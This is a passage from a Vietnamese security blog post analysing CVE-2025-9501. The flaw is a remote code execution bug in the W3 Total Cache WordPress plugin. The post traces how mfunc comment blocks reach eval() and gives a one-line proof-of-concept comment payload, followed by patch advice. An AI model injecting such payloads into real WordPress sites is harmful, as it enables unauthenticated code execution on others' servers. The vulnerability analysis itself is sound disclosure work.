&lt;code&gt;WP_CACHE&lt;/code&gt; được gọi trong &lt;code&gt;wp-settings.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( WP_CACHE &amp;amp;&amp;amp; apply_filters( &amp;#39;enable_loading_advanced_cache_dropin&amp;#39;, true ) &amp;amp;&amp;amp; file_exists( WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39; ) ) {&#xA;&#x9;// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.&#xA;&#x9;include WP_CONTENT_DIR . &amp;#39;/advanced-cache.php&amp;#39;;&#xA;&#xA;&#x9;// Re-initialize any hooks added manually by advanced-cache.php.&#xA;&#x9;if ( $wp_filter ) {&#xA;&#x9;&#x9;$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress sẽ tự động load file &lt;code&gt;advanced-cache.php&lt;/code&gt; nếu nó tồn tại. Khi plugin được active thì nó đã tạo ra file này:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/**&#xA; * File: advanced-cache.php&#xA; *&#xA; * W3 Total Cache advanced cache module.&#xA; *&#xA; * @package W3TC&#xA; */&#xA;&#xA;defined( &amp;#39;ABSPATH&amp;#39; ) || die();&#xA;&#xA;global $w3tc_start_microtime;&#xA;$w3tc_start_microtime = microtime( true );&#xA;&#xA;/**&#xA; * Abort W3TC loading if WordPress is upgrading.&#xA; */&#xA;if ( defined( &amp;#39;WP_INSTALLING&amp;#39; ) &amp;amp;&amp;amp; WP_INSTALLING ) {&#xA;&#x9;return;&#xA;}&#xA;&#xA;if ( ! defined( &amp;#39;W3TC_IN_MINIFY&amp;#39; ) ) {&#xA;&#x9;if ( ! defined( &amp;#39;W3TC_DIR&amp;#39; ) ) {&#xA;&#x9;&#x9;define( &amp;#39;W3TC_DIR&amp;#39;, ( defined( &amp;#39;WP_PLUGIN_DIR&amp;#39; ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . &amp;#39;/plugins&amp;#39; ) . &amp;#39;/w3-total-cache&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39; ) ) {&#xA;&#x9;&#x9;if ( defined( &amp;#39;WP_ADMIN&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;// Only display errors in wp-admin.&#xA;&#x9;&#x9;&#x9;printf( &amp;#39;&amp;lt;strong&amp;gt;W3 Total Cache Error:&amp;lt;/strong&amp;gt; some files appear to be missing or out of place. Please re-install plugin or remove &amp;lt;strong&amp;gt;%s&amp;lt;/strong&amp;gt;. &amp;lt;br /&amp;gt;&amp;#39;, __FILE__ );&#xA;&#x9;&#x9;}&#xA;&#x9;} else {&#xA;&#x9;&#x9;require_once W3TC_DIR . &amp;#39;/w3-total-cache-api.php&amp;#39;;&#xA;&#xA;&#x9;&#x9;if ( class_exists( &amp;#39;\W3TC\Dispatcher&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$w3tc_redirect = \W3TC\Dispatcher::component( &amp;#39;Mobile_Redirect&amp;#39; );&#xA;&#x9;&#x9;&#x9;$w3tc_redirect-&amp;gt;process();&#xA;&#xA;&#x9;&#x9;&#x9;$w3tc_config = \W3TC\Dispatcher::config();&#xA;&#x9;&#x9;&#x9;if ( $w3tc_config-&amp;gt;get_boolean( &amp;#39;pgcache.enabled&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$o = \W3TC\Dispatcher::component( &amp;#39;PgCache_ContentGrabber&amp;#39; );&#xA;&#x9;&#x9;&#x9;&#x9;$o-&amp;gt;process();&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi tính năng page cache (&lt;code&gt;pgcache&lt;/code&gt;) được bật thì &lt;code&gt;$o-&amp;gt;process()&lt;/code&gt; để xử lí logic của page cache.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; title=&#34;Enable page cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Page Cache&lt;/h2&gt;&lt;p&gt;Enable page cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/page_cache.png&#39; alt=&#34;Page Cache&#34; height=&#34;593&#34; width=&#34;1227&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable page cache&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong &lt;code&gt;process()&lt;/code&gt;, plugin chuẩn bị cơ chế can thiệp vào nội dung trang trước khi trả về cho trình duyệt.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function process() {&#xA;    $this-&amp;gt;run_extensions_dropin();&#xA;    // Skip caching for some pages.&#xA;    ...&#xA;    Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại dòng cuối, hàm gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Util_Bus::add_ob_callback( &amp;#39;pagecache&amp;#39;, array( $this, &amp;#39;ob_callback&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Plugin đăng ký một callback tên &lt;code&gt;pagecache&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Callback thực tế là phương thức &lt;code&gt;ob_callback&lt;/code&gt; của object hiện tại.&lt;/li&gt;&#xA;&lt;li&gt;Callback này sẽ được gọi &lt;strong&gt;sau khi WordPress sinh xong HTML&lt;/strong&gt;, để plugin có cơ hội xử lý (như tối ưu, nén, ghi cache…) trước khi gửi cho trình duyệt.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;add_ob_callback()&lt;/code&gt; chỉ làm nhiệm vụ lưu callback lại để sử dụng về sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ob_callback( $key, $callback ) {&#xA;    $GLOBALS[&amp;#39;_w3tc_ob_callbacks&amp;#39;][ $key ] = $callback;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;ob_callback()&lt;/code&gt; này được gọi khi output buffer xả nội dung HTML ra, và nó kiểm tra xem trang có “nội dung động” hay không:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ob_callback( $buffer ) {&#xA;    ...&#xA;    $has_dynamic = $this-&amp;gt;_has_dynamic( $buffer );&#xA;    ...&#xA;    // We can&amp;#39;t capture output in ob_callback so we use shutdown function.&#xA;    if ( $has_dynamic ) {&#xA;        $this-&amp;gt;_shutdown_buffer = $buffer;&#xA;&#xA;        $buffer = &amp;#39;&amp;#39;;&#xA;&#xA;        register_shutdown_function(&#xA;            array(&#xA;                $this,&#xA;                &amp;#39;shutdown&amp;#39;,&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$buffer&lt;/code&gt; là toàn bộ HTML mà WordPress vừa tạo ra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;_has_dynamic()&lt;/code&gt; kiểm tra xem trong HTML có phần nào &lt;strong&gt;không thể cache trực tiếp&lt;/strong&gt;, tức nó không được cố định:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _has_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    return preg_match(&#xA;        &amp;#39;~&amp;lt;!--\s*m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/m(func|clude)\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        $buffer&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Theo như &lt;a href=&#34;https://1fix.io/blog/2015/02/22/page-fragment-caching-w3-total-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;tài liệu&lt;/a&gt; tôi tìm được thì &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; sẽ được cấu hình trong &lt;code&gt;wp-config.php&lt;/code&gt; nếu muốn sử dụng &lt;code&gt;page fragment caching&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;define(&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;, &amp;#39;W3TC_DYNAMIC_SECURITY_VALUE&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nội dung động sẽ có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&#xA;or&#xA;&amp;lt;!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt; PHP code &amp;lt;!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu &lt;strong&gt;không có nội dung động&lt;/strong&gt;, hàm trả về &lt;code&gt;$buffer&lt;/code&gt; bình thường để có thể ghi cache ngay.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu &lt;strong&gt;có nội dung động&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Toàn bộ HTML được lưu lại vào &lt;code&gt;$this-&amp;gt;_shutdown_buffer&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Hàm trả về chuỗi rỗng (tạm thời không xuất gì ra)&lt;/li&gt;&#xA;&lt;li&gt;Plugin đăng ký &lt;code&gt;register_shutdown_function()&lt;/code&gt; để gọi phương thức &lt;code&gt;shutdown()&lt;/code&gt; sau khi PHP kết thúc chạy toàn bộ request&#xA;⇒ Việc xử lý HTML bị dời sang cuối cùng, sau khi mọi nội dung động đã sẵn sàng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function shutdown() {&#xA;    $compression = $this-&amp;gt;_page_key_extension[&amp;#39;compression&amp;#39;];&#xA;&#xA;    // Parse dynamic content.&#xA;    $buffer = $this-&amp;gt;_parse_dynamic( $this-&amp;gt;_shutdown_buffer );&#xA;&#xA;    // Compress page according to headers already set.&#xA;    $compressed_buffer = $this-&amp;gt;_compress( $buffer, $compression );&#xA;&#xA;    echo $compressed_buffer; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;shutdown&lt;/code&gt; sẽ gọi đến &lt;code&gt;_parse_dynamic()&lt;/code&gt; để Xử lý các khối động trong HTML - tìm trong toàn bộ HTML các khối đánh dấu nội dung động của W3TC và thay thế chúng bằng kết quả thực tế:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic( $buffer ) {&#xA;    if ( ! defined( &amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39; ) ) {&#xA;        return $buffer;&#xA;    }&#xA;&#xA;    $buffer = preg_replace_callback(&#xA;        &amp;#39;~&amp;lt;!--\s*mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mfunc\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array(&#xA;            $this,&#xA;            &amp;#39;_parse_dynamic_mfunc&amp;#39;,&#xA;        ),&#xA;        $buffer&#xA;    );&#xA;&#xA;    $buffer = preg_replace_callback(&#xA;        &amp;#39;~&amp;lt;!--\s*mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mclude\s*&amp;#39; . W3TC_DYNAMIC_SECURITY . &amp;#39;\s*--&amp;gt;~Uis&amp;#39;,&#xA;        array(&#xA;            $this,&#xA;            &amp;#39;_parse_dynamic_mclude&amp;#39;,&#xA;        ),&#xA;        $buffer&#xA;    );&#xA;&#xA;    return $buffer;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu hằng &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; chưa tồn tại → trả về nguyên HTML, coi như không có nội dung động.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu có, hàm lần lượt chạy hai &lt;code&gt;preg_replace_callback()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Tìm các cặp ghi chú dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfunc{security} --&amp;gt; ... &amp;lt;!-- /mfunc{security} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;và gọi &lt;code&gt;_parse_dynamic_mfunc()&lt;/code&gt; để xử lý nội dung bên trong.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Tìm các cặp ghi chú:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mclude{security} --&amp;gt; ... &amp;lt;!-- /mclude{security} --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;và gọi &lt;code&gt;_parse_dynamic_mclude()&lt;/code&gt; để xử lý tương tự.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Mỗi callback sẽ nhận đoạn HTML khớp với regex và trả về kết quả động đã được chạy.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Kết quả cuối cùng là &lt;code&gt;$buffer&lt;/code&gt; với các khối mfunc/mclude đã được thay thế bằng nội dung thực, sẵn sàng để nén và xuất ra cho người dùng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User requests any front‑end page (unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads wp-settings.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WP_CACHE = true → Load advanced-cache.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;advanced-cache.php runs Dispatcher&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;PgCache_ContentGrabber-&amp;gt;process()&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Util_Bus::add_ob_callback(&amp;#39;pagecache&amp;#39;, &amp;#39;ob_callback&amp;#39;)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;WordPress renders full HTML into output buffer&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;ob_callback($buffer) triggered&amp;#34;]&#xA;&#xA;H --&amp;gt; I{&amp;#34;_has_dynamic($buffer) ?&amp;#34;}&#xA;I --&amp;gt;|No| J[&amp;#34;Return buffer as-is → Serve cached page&amp;#34;]&#xA;I --&amp;gt;|Yes| K[&amp;#34;Save buffer to _shutdown_buffer&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;register_shutdown_function(shutdown)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;After request completes → shutdown()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;_parse_dynamic(_shutdown_buffer)&amp;#34;]&#xA;&#xA;N --&amp;gt; O{&amp;#34;HTML contains &amp;lt;!-- mfunc ... --&amp;gt; ?&amp;#34;}&#xA;O --&amp;gt;|Yes| P[&amp;#34;_parse_dynamic_mfunc()&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Extract payload from comment and run eval()&amp;#34;]&#xA;&#xA;O --&amp;gt;|Or mclude| R[&amp;#34;_parse_dynamic_mclude() (include type)&amp;#34;]&#xA;&#xA;Q --&amp;gt; S[&amp;#34;Output replaced with execution result&amp;#34;]&#xA;R --&amp;gt; S&#xA;&#xA;S --&amp;gt; T[&amp;#34;Page optionally compressed&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;echo back to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Install và active plugin, hàm thành bước setup cơ bản&lt;/li&gt;&#xA;&lt;li&gt;Bật tùy chọn Page Cache&lt;/li&gt;&#xA;&lt;li&gt;Cấu &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Comment một post bất kì với content :&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfuncvalue --&amp;gt;phpinfo();&amp;lt;!-- /mfuncvalue --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#39; alt=&#34;Result&#34; height=&#34;1078&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Giá trị của &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; có thể bị lộ khi quên bật tính năng Page Cache mà sử dụng nó ở nơi Unauthenticated User có thể thấy được.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; title=&#34;Sử dụng khi quên bật Page Cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss Page Cache&lt;/h2&gt;&lt;p&gt;Sử dụng khi quên bật Page Cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#39; alt=&#34;Miss Page Cache&#34; height=&#34;259&#34; width=&#34;427&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sử dụng khi quên bật Page Cache&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng CVE-2025-9501 xuất phát từ việc plugin W3 Total Cache sử dụng &lt;code&gt;eval()&lt;/code&gt; để xử lý các khối “dynamic fragment caching” (&lt;code&gt;&amp;lt;!-- mfunc ... --&amp;gt;&lt;/code&gt;) mà không có bất kỳ bước xác thực, lọc hoặc sandbox nào. Điều này cho phép kẻ tấn công chưa xác thực có thể chèn trực tiếp mã PHP vào nội dung trang, và mã này sẽ được thực thi trong giai đoạn &lt;code&gt;shutdown&lt;/code&gt;, sau khi WordPress đã kết thúc toàn bộ xử lý chính, dẫn đến Remote Code Execution (RCE).&lt;/p&gt;&#xA;&lt;p&gt;Vấn đề càng nghiêm trọng hơn khi logic cache và xử lý đầu ra nằm ngoài vòng đời chuẩn của WordPress, khiến các lớp bảo vệ như hook, nonce hoặc kiểm tra quyền truy cập không còn hiệu lực. W3TC 2.8.13 đã loại bỏ việc gọi &lt;code&gt;eval()&lt;/code&gt; trong cơ chế xử lý động, chính thức vá lỗ hổng này.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Việc sử dụng &lt;code&gt;eval()&lt;/code&gt; trong sản phẩm production gần như luôn dẫn đến RCE nếu đầu vào không được kiểm soát nghiêm ngặt.&lt;/li&gt;&#xA;&lt;li&gt;Plugin đã xử lý nội dung động &lt;strong&gt;sau toàn bộ vòng đời WordPress&lt;/strong&gt;, khiến nhiều lớp bảo vệ của core bị bypass.&lt;/li&gt;&#xA;&lt;li&gt;Page Fragment Caching của W3TC cho phép chạy code PHP từ HTML comment – chỉ cần một cấu hình sai hoặc thiếu chặn đầu vào là đủ cho tấn công.&lt;/li&gt;&#xA;&lt;li&gt;RCE được kích hoạt trong &lt;code&gt;register_shutdown_function()&lt;/code&gt;, khiến payload chạy ở thời điểm cuối của request – khó bị phát hiện bởi quá trình phân tích thông thường.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật plugin ngay lập tức là cách bảo vệ duy nhất trong trường hợp hệ thống vẫn đang sử dụng &amp;lt;= 2.8.12.&lt;/li&gt;&#xA;&lt;li&gt;Đối với mọi hệ thống PHP, &lt;strong&gt;tuyệt đối tránh &lt;code&gt;eval()&lt;/code&gt; nếu không có sandbox và validation cực kỳ chặt&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 